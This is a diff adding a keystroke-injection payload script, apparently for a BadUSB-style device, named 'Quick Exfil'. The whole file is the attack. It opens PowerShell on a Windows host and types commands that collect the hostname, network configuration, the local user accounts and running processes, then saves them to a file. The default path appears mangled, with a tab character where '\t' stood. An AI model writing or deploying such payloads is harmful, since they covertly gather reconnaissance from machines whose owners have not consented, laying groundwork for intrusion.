@@ -1,0 +1,24 @@
+NAME Quick Exfil
+DESCRIPTION Exfil system info by typing into notepad then saving
+CATEGORY recon
+PLATFORMS WIN
+OPTION FILENAME C:\	emp\recon.txt "Output file path"
+PLATFORM WIN
+DELAY 500
+PRINT Exfiltrating system info...
+LED_COLOR RED
+OPEN_POWERSHELL
+STRINGLN $info = @()
+STRINGLN $info += "=== HOSTNAME ==="
+STRINGLN $info += hostname
+STRINGLN $info += "=== IP CONFIG ==="
+STRINGLN $info += (ipconfig | Out-String)
+STRINGLN $info += "=== USERS ==="
+STRINGLN $info += (net user | Out-String)
+STRINGLN $info += "=== PROCESSES ==="
+STRINGLN $info += (Get-Process | Select Name,Id | Out-String)
+STRINGLN $info -join "`n" | Out-File -FilePath {{FILENAME}}
+DELAY 2000
+STRINGLN exit
+LED_COLOR GREEN
+PRINT Recon saved to {{FILENAME}}
